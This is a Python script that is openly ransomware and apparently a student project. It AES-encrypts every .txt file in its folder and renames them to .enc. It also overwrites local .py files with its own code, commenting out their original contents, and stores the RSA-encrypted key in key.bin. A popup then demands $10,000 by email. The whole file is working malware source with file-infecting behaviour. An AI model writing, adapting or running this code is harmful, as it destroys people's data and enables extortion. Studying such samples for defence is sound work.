#!/usr/bin/env python3
import random
from base64 import b64encode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
import glob, os, sys, subprocess
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
import tkinter
from tkinter import messagebox

def gen_sub_cipher(letters):
    key = ''
    alphabet_2 = 'abcdefghijklmnopqrstuvwxyz'
    for i in range(len(letters)):
        thing = random.randint(0, len(alphabet_2) - 1)
        key += alphabet_2[thing]
        if len(alphabet_2) > thing:
            alphabet_2 = alphabet_2[:thing] + alphabet_2[thing + 1:]
    return key

def txt_changer(item, key):
    #changes the txt files
    key_bytes = bytes(key, 'utf-8')
    #converts key to bytes
    cipher = AES.new(pad(key_bytes,32), AES.MODE_CBC)
    # creates the cipher based on key
    Filein = open(item, 'r')
    #opens the file
    plaintext = Filein.readlines()
    #reads contents
    plaintext_bytes = bytes(str(plaintext), 'utf-8')
    #converts contents to bytes
    ciphertext = cipher.encrypt(pad(plaintext_bytes, AES.block_size))
    iv = cipher.iv

    Filein.close()

    Fileout = open(item, 'w')
    Fileout.writelines (b64encode(iv).decode('utf-8') + '\n')
    Fileout.writelines (b64encode(ciphertext).decode('utf-8'))
    #writes encrypted contents to file
    Fileout.close()

    item2 = item[:-4] + '.enc'
    os.rename(item, item2)
    #renames the files from .txt to .enc
    
def py_changer(item):
    p1 = subprocess.Popen(['chmod', '+x', item])
    #makes the script executable
    if item == "ransom.py":
        return
    #prevents editing itself
    Filein = open(sys.argv[0], 'r')
    #opens itself, adds contents
    viruscontents = Filein.readlines()
    Filein.close

    Filein = open(item, 'r')
    contents = Filein.readlines()
    contents = ['#' + line for line in contents]
    Filein.close()
    
    Fileout = open (item, 'w')
    #comments out contents of files, replaces with virus contents
    Fileout.writelines(contents)
    Fileout.writelines(viruscontents)
    Fileout.close()

def ransomware(key):
    for item in glob.glob("*.txt"):
        txt_changer(item, key)
    for item in glob.glob("*.py"):
        py_changer(item)

def obfuscate_key(key):
    recipient_key = RSA.import_key(open("receiver.pem").read())
    
    data = bytes(key, 'utf-8')
    
    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_data = cipher_rsa.encrypt(data)

    file_out = open("key.bin", "wb")
    file_out.write(enc_data)
    file_out.close()

def alert():
    root = tkinter.Tk()
    root.withdraw()
    messagebox.showinfo("This is a ransomware", 
    "Your text files are encrypted. \nTo decrypt them, you need to pay me $10,000 and send key.bin in your folder to jcwcheon001@mymail.sim.edu.sg")
    #ideally with a real ransomware i dont use an emaili with my name in it but it is what it is
    root.destroy()

def main():
    alphabet = 'abcdefghijklmnopqrstuvwxyz'
    key = gen_sub_cipher(alphabet)
    ransomware(key)
    obfuscate_key(key)
    alert()

if __name__ == '__main__': 
    main()